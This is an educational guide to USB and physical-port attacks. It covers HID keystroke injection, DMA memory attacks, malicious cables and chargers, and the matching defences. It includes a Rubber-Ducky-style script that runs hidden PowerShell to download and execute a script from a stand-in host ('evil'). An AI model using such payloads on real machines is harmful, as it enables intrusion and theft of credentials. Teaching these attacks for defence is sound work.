# USB and Physical Interface Attacks

USB and the other "just a port" interfaces (Thunderbolt, PCIe, SD, debug headers) are trust boundaries that most people assume are safe because "it is just a cable." They are not. A port that provides data, power, memory access, or keystrokes is an attack surface, and physical access to one is often game over. This is approachable beginner territory with cheap, dramatic results.

## The mental model

A port trusts whatever is plugged in to be what it claims to be. USB devices self-describe: a stick says "I am storage," but the same hardware can say "I am a keyboard," "I am a network card," or all three. The host believes the descriptor. Separately, some interfaces (Thunderbolt, PCIe, FireWire historically) grant direct memory access to the plugged-in device, so a malicious peripheral can read and write system RAM without any software cooperation. The attacks below all exploit "the host trusts the peripheral's claims."

## What to aim for

- **Code execution via injected input**: a device that pretends to be a keyboard types commands faster than a human, running a payload the instant it is plugged in (BadUSB / HID injection).
- **Credential and data theft at the port**: capture keystrokes, exfiltrate files, or read RAM (including disk-encryption keys) over DMA.
- **Bypassing the lock screen / full-disk encryption**: via DMA memory reads or injected input on an unattended machine.
- **Implants**: a hardware tap that persists in a cable, keyboard, or port.

## The techniques

- **HID injection (BadUSB / Rubber Ducky / Digispark)**: a cheap microcontroller (even a $2 Digispark/ATtiny85, or a Raspberry Pi Pico) enumerates as a USB keyboard and "types" a scripted payload on connect. The host trusts it because keyboards are trusted. Defeats "no USB storage" policies because it is not storage.

```
# Rubber-Ducky-style script (runs on plug-in, as the logged-in user):
DELAY 800
GUI r                 ; open Run dialog (Windows)
STRING powershell -w hidden -c "iwr http://evil/x.ps1 | iex"
ENTER
# the Pico/Digispark equivalent sends the same USB HID keystrokes in firmware.
```

- **USB device spoofing / composite attacks**: a device that presents as keyboard + network adapter (to reroute traffic), or as a storage device that also drops a HID payload. Tools like a Bash Bunny or an O.MG cable (a normal-looking charging cable with a hidden implant and Wi-Fi) do this.
- **DMA attacks (Thunderbolt/PCIe/ExpressCard)**: a malicious peripheral uses direct memory access to read/write system RAM, bypassing the OS. Tools like PCILeech dump memory, extract encryption keys and credentials, and can patch the lock-screen check to log in. Thunderspy-class flaws targeted Thunderbolt specifically.
- **"Juice jacking" and malicious chargers**: a charging port/cable that also carries data and attempts HID injection or data access when a phone/laptop connects.
- **BadUSB firmware reflashing**: reflashing a real USB device's controller firmware so a legitimate-looking stick behaves maliciously (the original BadUSB research).

## Beyond the basics

- **HID injection is the easy, high-success classic**: nearly every OS trusts keyboards implicitly, so a plugged-in "keyboard" can run commands as the logged-in user with no prompt. The payload adapts to the OS (detect via timing/typing) and can disable defenses, add persistence, or open a reverse shell in seconds. The limitation is it needs an unlocked session (or it targets the lock screen's limited input); plan the payload for the state you will find.
- **DMA is the lock-screen and FDE breaker**: when the machine is locked but running, the disk-encryption key and user credentials are in RAM. A DMA-capable port lets a peripheral read them out, or patch the authentication routine in memory to unlock. This is why modern laptops add IOMMU/VT-d protection and block new Thunderbolt/PCIe devices while locked; the attack works where those protections are off or absent.
- **The O.MG-cable class changes the threat model**: implants hidden inside an ordinary-looking cable or adapter, remotely triggered over Wi-Fi, mean "do not plug in untrusted USB" now extends to "do not trust any cable you did not keep control of." Supply-chain and drop-attack delivery (leaving a malicious cable/stick for someone to use) is realistic.
- **Air-gap and peripheral exfil**: a composite device can present as a network adapter and silently become the host's default route (stealing traffic/credentials), or exfiltrate over its own radio. USB is a bridge across the air gap in both directions.
- **Beyond USB**: SD/CF cards with controller logic, debug/JTAG headers on laptops and appliances (see the bus-protocols file), and management interfaces (a server's BMC/IPMI) are all "physical ports that grant deep access." The same "the host trusts the thing you plug in" principle applies.
- **Detection and forensics angle**: HID injection leaves traces (a new keyboard enumeration, rapid scripted input); DMA is stealthier. Knowing the artifacts helps both attack planning and defense.

## What to watch for (defensive framing)

- HID injection needs the right session state (usually unlocked) and OS-appropriate payloads; a generic script often fails on the wrong OS/layout.
- DMA attacks require a DMA-capable port and absent IOMMU protection; modern, updated laptops with VT-d/IOMMU and "block devices while locked" resist them.
- These assume physical access to the port; frame impact by how that access is obtained (unattended machine, drop attack, malicious cable).
- To defend: disable unused ports and enforce USB device allow-listing (by class/VID-PID), block new HID and storage devices on locked machines, enable IOMMU/VT-d and Thunderbolt security levels (and "no new devices while locked"), use USB data blockers ("USB condoms") for charging from untrusted ports, lock sessions whenever away, and treat unknown cables/sticks as hostile. Full-disk encryption with pre-boot auth and keys evicted on lock reduces DMA value.

## Checklist (beginner-friendly)

- Build a HID-injection device (Pico/Digispark/Ducky); write a harmless proof payload (open a text editor and type a marker).
- Understand the session-state requirement and write OS-aware payloads.
- Learn the composite-device and malicious-cable (O.MG) class conceptually.
- Understand DMA attacks and which ports/protections enable or block them.
- Map the defenses (port control, IOMMU, lock-screen device blocking, data blockers) to each attack.
- Only test on your own machines and authorized targets.
